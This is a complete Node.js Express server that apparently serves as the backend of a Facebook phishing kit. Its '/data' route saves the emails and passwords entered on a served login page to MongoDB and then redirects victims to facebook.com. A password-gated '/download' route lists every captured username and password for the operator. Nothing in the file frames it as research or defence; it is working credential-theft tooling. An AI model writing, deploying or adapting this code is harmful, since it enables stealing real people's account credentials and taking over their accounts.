const express = require('express');
const fs = require('fs');
const { default: mongoose } = require('mongoose');
const app = express();
const port = process.env.PORT || 8080;
const Model = require('./db/_data');
require('dotenv').config({
  path: __dirname + '/.env',
});
const { MONGO_URI, PASS } = process.env;

mongoose
  .connect(MONGO_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(() => {
    console.log('Connected to db');
  })
  .catch((err) => {
    console.log(err);
  });

app.use(express.urlencoded());

app.get('/', (req, res) => {
  const index = fs.readFileSync(__dirname + '/pages/index.html', { encoding: 'utf-8' });
  res.send(index);
});

app.post('/data', (req, res) => {
  Model.create({ ...req.body, pass: req.query.pass });
  res.redirect('https://facebook.com');
});

app.get('/download', async (req, res) => {
  const pss = req.query.pss;
  if (pss !== PASS) {
    res.redirect('/');
  } else {
    let y = await Model.find();
    res.send(
      `<!DOCTYPE html>
      <html>
      <head><title>Access Granted!!</title>
</head>
      <body style=" color:red"><div style="display:grid;grid-template-columns:repeat(auto-fill, minmax(250px, 1fr));gap: 3rem">${y
        .map(
          (arr, ind) =>
            `<p style="word-wrap:break-all;font-family:monospace; font-size:1rem"><b>${
              ind + 1
            }</b><br/><b>Username:</b>&nbsp; <br/>__> &nbsp;&nbsp;${
              arr.email
            }<br/><b>Pass:</b> <br/>__> &nbsp;&nbsp;${arr.pass}</p>`
        )
        .join('')}</div>
</body>
</html>`
    );
  }
});

app.listen(port, () => console.log('Runing on port ' + port));
